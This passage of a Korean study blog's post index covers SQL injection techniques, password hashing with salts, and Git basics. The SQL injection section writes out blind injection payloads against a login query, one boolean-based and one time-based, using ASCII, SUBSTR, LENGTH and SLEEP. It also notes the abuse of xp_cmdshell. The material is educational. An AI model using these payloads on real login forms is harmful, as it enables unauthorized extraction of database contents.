쿼리문이 합쳐져서 하나의 테이블로 보여지게 된다.④ 과정 : 사용자의 id와 passwd를 요청하는 쿼리문을 주입함⑤ 결과 : 사용자의 개인정보가 게시글과 함께 화면에 보여짐2-3. Blind SQL Injection (1)[1] Boolean based SQL[2] 사용되는 SQL문 : limit, SUBSTR, ASCII..[3] 특정한 값이나 데이터를 전달받는 것이 아닌, 쿼리를 통해 나온 참과 거짓의 정보만을 통해 정보를 취득함[4] 에러가 발생되지 않는 사이트에서는 논리적 에러를 이용하거나 UNION을 이용할 수가 없기 때문에, Blind를 통해 정상적인 쿼리가 수행되는지, 혹은 쿼리가 수행되지 않아 쿼리 결과가 없는지를 판단함[5] 서버가 응답하는 성공과 실패 여부를 이용하여 DB의 테이블 정보 등을 추출해 낼 수 있음EXAMPLE (로그인 폼 통해 DB의 테이블 명 알아내기)① 공격 대상 : SELECT * FROM Users WHERE id = ‘INPUT1’ AND password = ‘INPUT2’② 공격 예시 : SELECT * FROM Users WHERE id = ‘abc123’ and ASCII(SUBSTR((SELECT name FROM information_schema.tables WHERE table_type=’base table’ limit 0,1),1,1)) &amp;gt; 100 (로그인이 될 때까지 시도) – INPUT1’ AND password = ‘INPUT2’③ 해설 : 위의 쿼리문은 DB의 테이블 명을 알아내는 쿼리문이다.④ 과정 : 임의로 가입한 abc123이라는 아이디와 함께 뒤의 구문을 주입한다. 해당 구문은 테이블 명을 조회하는 구문으로 limit 키워드를 통해 하나의 테이블만 조회하고, SUBSTR 함수로 첫 글자만, ASCII를 통해서 ascii 값으로 변환한다. 만약 조회되는 테이블 명이 Users 라면 ‘U’ 자가 ascii 값으로 조회가 될 것이고, 뒤의 100이라는 숫자 값과 비교하게 된다.⑤ 결과 : 거짓이면 로그인 실패가 될 것이고, 참이 될 때까지 뒤의 100이라는 숫자를 변경해 가면서 비교하면 된다. 공격자는 이 프로세스를 자동화 스크립트로 만들어 단기간 내에 테이블 명을 알아낼 수 있다.2-4. Blind SQL Injection (2)[1] Time based SQL[2] 사용되는 SQL문 : SLEEP, BENCHMARK..[3] 쿼리 결과를 특정 시간만큼 지연시키는 것[4] Blind와 마찬가지로 에러가 발생되지 않는 조건에서 사용하며, 참 혹은 거짓이라는 결과값이 나오지 않으므로 시간을 재는 것[5] 궁극적으로는 DB 구조를 파악하기 위함EXAMPLE (로그인 폼 통해 DB의 길이 알아내기)① 공격 대상 : SELECT * FROM Users WHERE id = ‘INPUT1’ AND password = ‘INPUT2’② 공격 예시 : SELECT * FROM Users WHERE id = ‘abc123’ OR (LENGTH(DATABASE())=1 (SLEEP 할 때까지 시도) AND SLEEP(2)) – INPUT1’ AND password = ‘INPUT2’③ 해설 : LENGTH는 문자열의 길이를 반환하고, DATABASE는 DB의 이름을 반환한다.④ 과정 : LENGTH(DATABASE()) = 1 이 참이면 SLEEP(2)가 동작하고, 거짓이면 동작하지 않는다.⑤ 결과 : 숫자 1 부분을 조작하여 DB의 길이를 알아낼 수 있다.⑥ 예외 : SLEEP이라는 단어가 치환 처리 되어있는 경우, BENCHMARK나 WAIT 함수를 사용할 수 있다.2-5. Stored Procedure SQL Injection[1] Stored Procedure (저장 프로시저) : 편의를 위해 일련의 쿼리들을 모아 하나의 함수처럼 모아둔 것[2] 대표적으로, MS SQL에서 사용할 수 있는 xp_cmdshell을 통해 윈도우 명령어를 실행할 수 있음 → 자주 악용됨[3] 단, 공격자가 시스템 권한을 획득해야 하므로 공격난이도가 높음.[4] 공격에 성공한다면 서버에 직접적인 피해를 입힐 수 있음.2-6. Mass SQL Injection[1] 다량의 SQL Injection 공격[2] 한 번의 공격으로 다량의 DB가 조작되어 큰 피해를 입히는 것을 의미[3] 보통 MS-SQL을 사용하는 ASP 기반 웹 애플리케이션에서 많이 사용됨[4] 쿼리문은 Hex* 인코딩* 방식으로 인코딩하여 공격함[5] DB 값을 변조하여 DB에 악성 스크립트를 삽입하고, 사용자들이 변조된 사이트에 접속 시 좀비 PC로 감염되게 함.[6] 이렇게 감염된 좀비 PC들은 DDoS* 공격에 사용됨. 인코딩 : 문자들의 집합을 부호화하는 방법. 즉, 컴퓨터가 이용할 수 있는 신호로 만드는 것 인코딩 기준 : ASCII, Hex, URL, Base 64, 유니코드.. Hex : 16을 밑으로 하는 기수법. 0~9와 A~F를 사용하고, 대소문자는 구별하지 않음 DDoS : Distributed Denial of Service. 대량의 패킷 또는 요청을 생성하여 대상 시스템을 마비시키는 공격 기법 " }, { "title": "해싱 (Hashing)", "url": "/posts/Hashing/", "categories": "Study, Computer", "tags": "", "date": "2021-10-17 00:00:00 +0900", "snippet": "해싱 (Hashing)1. 해싱의 쓰임새유저의 PW는 해싱하여 DB에 저장한다. 암호화 하지 않으면 DB가 해킹 당했을 경우, 유저의 PW가 그대로 노출된다. 외부 해킹이 아니더라도, 내부 개발자나 인력의 유저들의 PW를 볼 수 있게 된다. PW 암호에는 일반적으로 단방향 해시 함수가 쓰인다. 2. 해싱 (Hashing) vs 암호화 (Encryption)일상에서는 어느 정도 통용되지만, 암호학적으로는 차이가 있다.가장 큰 차이는 ‘방향성’ 이다. 해싱 : 단방향. 복호화가 불가능하다. 암호화 : 양방향. 역으로 복호화가 가능하다. 3. 단방향 해시 함수 (One-Way Hash Function)어떤 수학적 연산 (또는 알고리즘) 에 의해 원본 데이터를 매핑시켜 완전히 다른 암호화된 데이터로 변환시키는 것.해시와 다이제스트변환 그 자체를 해시라고 부르고, 해시에 의해 암호화된 데이터를 다이제스트 (Digest) 라고 한다.이러한 단방향 해시 함수의 종류는 매우 많다. (SHA, MD, HAS, WHIRLPOOL…)가장 대표적인 해시 알고리즘인 SHA-256을 통해 123456을 해싱하면,8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92 와 같이 나온다.사용자 가입 시 PW를 그대로 저장하는게 아니라, 이렇게 나온 다이제스트를 DB에 저장한다.다이제스트는 복호화가 불가능하기 때문에, DB를 털어 저런 값을 얻었다고 한들 실제 PW를 유추하기는 어렵다.단방향 해시 함수의 한계점 동일한 메시지는 동일한 다이제스트를 갖는다. (Rainbow Table 의 존재) Brute Force (MD5를 사용한 경우 1초에 약 56억번까지도 대입 가능 + 사전) : 해시 함수는 원래 PW를 저장하기 위해서 설계된 것이 아니라, 짧은 시간에 데이터를 검색하기 위해 설계된 것이기 때문에 처리 속도가 매우 빠르다. 해시 충돌 (Hash Collsion) : 두 개의 서로 다른 입력에 대해 동일한 값을 얻게 되는 경우를 발견하면 이를 악용하여 위조된 데이터로 바꿔치기가 가능하다. 단방향 해시 함수 보완하기 키 스트레칭 (Key Stretching) : 해시 함수를 여러 번 수행하는 것으로 횟수는 개발자 본인만 알고 있다. Brute Force를 최대한 무력화 하기 위한 방법이다. (여전히 Rainbow Table 존재 가능) 솔트 (Salt) : 해시 함수를 돌리기 전, 원문 PW에 임의의 문자열을 덧붙이는 것. 단어 그대로 소금치는 (Salting) 것이다. 사용자마다 다른 솔트를 사용한다면 설령 같은 비밀번호더라도 다이제스트의 값이 다르기에 공격자에 의해 유추될 확률이 현저히 낮아진다. 사용자 가입 시 최종 다이제스트와 고유 솔트를 DB에 저장한다. 고유 솔트를 알았다고 한들, 해당 솔트와 결합하여 임의의 문자열을 Brute Force 해보아야 하기 때문에 방대한 데이터를 필요로 한다. 이로 인해 자연스럽게 Rainbow Table을 방지할 수 있다. 두 가지 방법의 혼용 : PW+Salt → Hash → Digest+Salt → Hash …(n번)… → 최종 Digest (매 해시 함수를 사용할 때마다 솔트를 추가하여 덧붙인다.) " }, { "title": "Git 기초", "url": "/posts/Git-Basic/", "categories": "Tools, Git", "tags": "", "date": "2021-10-17 00:00:00 +0900", "snippet": "Git 기초1. Git 영역 정리 Working Directory (Local) ↓ Add ↓ Index (= Staging Area) ↓ Commit ↓ Repository ↓ Push ↓ Remote Repository 2. Git Upload 순서 Init : 저장소 생성 Add : 파일을 인덱스에 올리기 (= Staging Area) Commit : 로컬 저장소에 올리기 Push : 원격 저장소에 올리기 Git Init 로컬 저장소로 사용할 폴더로 이동$ cd &#39;로컬 저장소로 사용할 폴더의 경로&#39; 새로운 저장소 생성$ git init Git Add 한 개의 파일을 인덱스에 추가$ git add &#39;파일명&#39; 폴더 내의 모든 파일을 인덱스에 추가$ git add . Git Commit 파일을 로컬 저장소에 올리기 (= 변경 내용 확정)$ git commit -m &#39;설명&#39; 한 번이라도 Add 했었던 파일은 아래 명령으로 Add와 Commit 작업을 한 번에 수행할 수 있다.$ git commit -am &#39;설명&#39; Git Push 원격 저장소 연결 (= Github)$ git remote add origin &#39;원격 저장소 Github URL&#39; 파일을 원격 저장소에 올리기$ git push origin &#39;브랜치명&#39; Git Pull 다른 사람이 (또는 다른 환경에서의 내가) 원격 저장소에 업데이트한 파일이 있을 경우, 아래 명령을 통해 로컬 저장소로 받아올 수 있다.$ git pull" } ]